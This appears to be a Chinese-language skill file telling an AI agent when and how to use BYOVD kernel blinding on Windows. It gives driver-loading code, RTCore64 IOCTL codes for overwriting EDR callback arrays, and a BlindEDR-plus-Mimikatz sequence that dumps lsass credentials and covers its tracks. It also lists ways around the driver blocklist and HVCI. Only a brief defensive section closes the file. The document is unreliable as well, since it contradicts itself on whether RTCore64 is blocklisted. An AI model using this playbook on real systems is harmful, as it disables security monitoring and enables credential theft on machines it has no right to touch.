---
name: byovd-kernel-evasion
description: >-
  BYOVD (Bring Your Own Vulnerable Driver) + 内核致盲 playbook. Use when you need to disable EDR/AV kernel callbacks, terminate protected processes, or gain kernel-level code execution on Windows. Covers driver selection, loading, IOCTL exploitation, callback manipulation, and LOLDrivers integration. Also use when EDR is blocking Mimikatz, process injection, or credential dumping — kernel blinding is often the last-resort bypass.
---

# BYOVD + 内核致盲 — 实战手册

> **触发场景**: EDR 在用户态被绕过但仍在内核层拦截敏感操作（如 lsass 读取、进程注入）；需要完全致盲 EDR 以执行 Mimikatz；需要终止受保护的杀软进程。

## 0. 前置条件

**必须满足**:
- 目标系统已获得管理员权限
- Windows 未启用 HVCI / VBS（`System Information → Virtualization-based security: Not enabled`）
- 在合法授权的安全评估场景下操作

**不可用场景**:
- Win11 24H2 默认开启 HVCI → BYOVD 驱动加载被拦截
- Secure Boot + HVCI 同时启用 → 需要先绕过 HVCI（见替代方案）

---

## 1. BYOVD 攻击流程（5步）

### 步骤1: 权限确认
```
whoami /all | findstr "S-1-16-12288"
```
必须是 High Integrity（管理员），否则需要先提权。

### 步骤2: 选择漏洞驱动

根据攻击目标选择驱动：

| 驱动 | 原始厂商 | 内核能力 | 主要用途 |
|---|---|---|---|
| **RTCore64.sys** | MSI Afterburner | 物理内存读写 (R/W) | 通用致盲、提权 |
| **gdrv.sys** | Gigabyte | 物理内存读写 | 通用致盲 |
| **DBUtil_2_3.sys** | Dell | 物理内存读写 | 驱动卸载 |
| **kprocesshacker.sys** | Process Hacker | 进程终止 | 杀EDR进程 |
| **aswArPot.sys** | Avast | 内核回调操作 | EDR回调清除 |
| **zamguard64.sys** | Zemana | 注册表/内核回调 | 回调清除 |
| **ene.sys** | ENE Technology | 物理内存读写(R/W) | 通用致盲 |

> **首选**: RTCore64.sys — 签名仍在有效期、哈希不在 Microsoft Blocklist（2026年5月）、工具链成熟。

### 步骤3: 加载驱动

```c
// 方法1: 通过服务管理器加载（推荐）
SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
SC_HANDLE hService = CreateServiceA(
    hSCManager, "RTCore64", "RTCore64",
    SERVICE_START | SERVICE_STOP | DELETE,
    SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
    "C:\\Windows\\Temp\\RTCore64.sys",
    NULL, NULL, NULL, NULL, NULL
);
StartServiceA(hService, 0, NULL);
```

```powershell
# 方法2: PowerShell 加载（需管理员）
sc.exe create RTCore64 type= kernel start= demand binPath= C:\Windows\Temp\RTCore64.sys
sc.exe start RTCore64
```

### 步骤4: 枚举并清除 EDR 内核回调

EDR 注册的内核回调类型及清除方法：

| 回调类型 | API 函数 | 在内存中的结构 | 清除方法 |
|---|---|---|---|
| 进程通知 | `PsSetCreateProcessNotifyRoutine(Ex)` | 回调数组 | 物理内存写入 NULL |
| 线程通知 | `PsSetCreateThreadNotifyRoutine(Ex)` | 回调数组 | 物理内存写入 NULL |
| 镜像加载 | `PsSetLoadImageNotifyRoutine` | 回调数组 | 物理内存写入 NULL |
| 对象回调 | `ObRegisterCallbacks` | CallbackListHead | 链表脱链 |
| 注册表回调 | `CmRegisterCallback` | CallbackListHead | 链表脱链 |
| MiniFilter | `FltRegisterFilter` | Frame链表 | 驱动卸载 |

**通过 RTCore64.sys 的 IOCTL 清除回调**:

```c
// RTCore64.sys IOCTL 码
#define IOCTL_READ_PHYS_MEM  0x80002048
#define IOCTL_WRITE_PHYS_MEM 0x8000204C
#define IOCTL_MAP_IO_SPACE   0x80002040

// 物理内存写入请求结构
typedef struct {
    DWORD64 physAddr;   // 物理地址
    DWORD   size;       // 大小
    BYTE    data[256];  // 要写入的数据
} PHYS_MEM_REQUEST;

// 清除回调示例
PHYS_MEM_REQUEST req;
req.physAddr = callbackArrayPhysAddr;  // 通过特征扫描找到的回调数组物理地址
req.size = 8;
memset(req.data, 0, 8);  // 用 NULL 覆盖回调指针
DeviceIoControl(hDevice, IOCTL_WRITE_PHYS_MEM, &req, sizeof(req), NULL, 0, &bytes, NULL);
```

### 步骤5: 执行敏感操作 + 恢复

```c
// 在致盲窗口期内执行操作
// 1. dump lsass (Mimikatz sekurlsa::logonpasswords)
// 2. 进程注入
// 3. 文件操作

// 恢复回调（可选，降低检测概率）
req.physAddr = callbackArrayPhysAddr;
memcpy(req.data, savedCallbackPtr, 8);
DeviceIoControl(hDevice, IOCTL_WRITE_PHYS_MEM, &req, sizeof(req), NULL, 0, &bytes, NULL);

// 卸载驱动
sc.exe stop RTCore64
sc.exe delete RTCore64
```

---

## 2. LOLDrivers 集成

[LOLDrivers](https://www.loldrivers.io) 是社区维护的 BYOVD 知识库，截至 2026 年收录 500+ 可利用驱动。

### 使用时获取最新列表

```bash
git clone https://github.com/magicsword-io/LOLDrivers.git
cd LOLDrivers
# 驱动哈希列表
cat drivers.json | jq '.[] | {name: .Name, sha256: .SHA256, capabilities: .Tags}'
```

### 检测资源（防御方视角）

LOLDrivers 还提供:
- **YARA 规则**: 用于扫描恶意驱动文件 (`yara/` 目录)
- **Sigma 规则**: 用于 SIEM 检测驱动加载事件 (`sigma/` 目录)
- **IOC 哈希列表**: 可导入 EDR 的黑名单 (`iocs/` 目录)

---

## 3. EDR 杀手工具速查

| 工具 | 目标 | 技术 | 状态 |
|---|---|---|---|
| **BlindEDR** | 通用 EDR | 回调清除+恢复 | 开源 |
| **Terminator** | Defender/CS/SEP | 内核回调删除 | 开源 |
| **BackStab** | CS Falcon | 回调反注册 | 开源 |
| **EDRSandBlast** | 通用 EDR | 多种致盲技术 | 开源 |
| **KDU** | 通用 | 多驱动支持、签名绕过 | 开源 |
| **PPLKiller** | PPL进程 | 进程保护绕过 | 开源 |
| **Mimidrv** | LSASS保护 | Mimikatz内核驱动 | 随Mimikatz |

---

## 4. Microsoft 对抗措施及绕过

| 防御措施 | 启用条件 | 绕过方法 |
|---|---|---|
| Vulnerable Driver Blocklist | Win11 默认 | 使用不在列表中的新发现驱动 / 修改驱动哈希 |
| HVCI (内存完整性) | Win11 24H2 默认 | 需要额外 RCE + 禁用 HVCI（需重启）/ Hypervisor 层规避 |
| EV证书强制 | 2025年起 | 寻找仍有效的老签名驱动 |
| KDP (内核数据保护) | 企业版可选 | 物理内存攻击绕不过 KDP → 需要找不依赖回调清除的致盲路径 |

### Win11 24H2+ HVCI 环境替代方案

HVCI 阻止了传统 BYOVD，但仍有替代路径：
1. **签名伪造**: 盗取/伪造有效 WHQL 签名（高门槛）
2. **漏洞驱动链**: 先利用内核漏洞(CVE) → 再用漏洞驱动
3. **用户态致盲**: 回归 AMSI/ETW bypass + unhooking + syscall（不碰内核）
4. **WHP Hypervisor**: 创建微型 Hypervisor 在 Ring-1 拦截保护

---

## 5. 实战案例：BlindEDR 致盲 + Mimikatz 全流程

```
[准备] → [加载 BlindEDR.sys] → [致盲] → [Mimikatz] → [恢复] → [清理]

# Step 1: 加载 BlindEDR
sc.exe create BlindEDR type= kernel start= demand binPath= C:\temp\BlindEDR.sys
sc.exe start BlindEDR

# Step 2: 致盲（BlindEDR 自动枚举并清除所有 EDR 回调）
BlindEDR.exe --blind

# Step 3: 在致盲窗口执行 Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# Step 4: 恢复
BlindEDR.exe --restore

# Step 5: 清理
sc.exe stop BlindEDR
sc.exe delete BlindEDR
del C:\temp\BlindEDR.sys
```

---

## 6. 踩坑记录

1. **RTCore64.sys 在 Win11 22H2+ 被 Blocklist 阻止** → 需使用 `DBUtil_2_3.sys` 或 `zamguard64.sys` 替代
2. **部分 EDR 检测到驱动加载立即告警** → 先 patch ETW 阻止事件上报，再加载驱动
3. **内核回调清除后 EDR 可能崩溃蓝屏** → 只清除特定回调而非全部，或使用恢复机制
4. **HVCI 环境下所有 BYOVD 失效** → 必须确认目标系统未启用 HVCI
5. **物理内存扫描需管理员+调试权限** → 确认 `SeDebugPrivilege` 已启用

---

## 7. 防御建议（蓝队视角）

- 启用 Secure Boot + HVCI（最有效）
- 部署 Microsoft Vulnerable Driver Blocklist 自动更新
- 通过 Sysmon Event ID 6 监控驱动加载
- 审计 `sc.exe create` 和 `sc.exe start` 命令
- 在 EDR 中配置内核回调完整性监控（检测回调表被篡改）
